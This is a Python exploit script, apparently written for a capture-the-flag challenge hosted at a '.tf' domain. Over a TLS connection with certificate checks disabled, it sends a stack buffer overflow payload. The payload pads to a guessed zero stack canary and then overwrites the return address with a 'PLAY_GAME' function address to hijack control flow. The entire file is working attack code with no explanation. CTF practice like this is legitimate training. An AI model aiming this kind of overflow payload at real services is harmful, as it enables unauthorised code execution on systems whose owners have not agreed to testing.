import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40

payload1 = b"A" * BUF_TO_CANARY + CANARY + b"B" * 8

raw = socket.create_connection((HOST, PORT), timeout=5)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)

s.sendall(str(len(payload1)).encode() + b"\n")
buf = b""
s.settimeout(3.0)
while True:
    chunk = s.recv(1024)
    if not chunk: break
    buf += chunk
    if b"what is your name?" in buf:
        break

s.sendall(payload1)
time.sleep(1)

s.settimeout(2.0)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        print(chunk.decode(errors='replace')[:200])
        break
except:
    pass
s.close()

PLAY_GAME = 0x4019a3
payload2 = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8
    + (PLAY_GAME).to_bytes(8, "little")
)

raw = socket.create_connection((HOST, PORT), timeout=5)
s = ctx.wrap_socket(raw, server_hostname=HOST)

s.sendall(str(len(payload2)).encode() + b"\n")
buf = b""
while True:
    chunk = s.recv(1024)
    if not chunk: break
    buf += chunk
    if b"what is your name?" in buf:
        break

s.sendall(payload2)
time.sleep(1)

s.settimeout(2.0)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        print(chunk.decode(errors='replace')[:200])
        break
except:
    pass
s.close()

print("\n=== Tests complete ===")
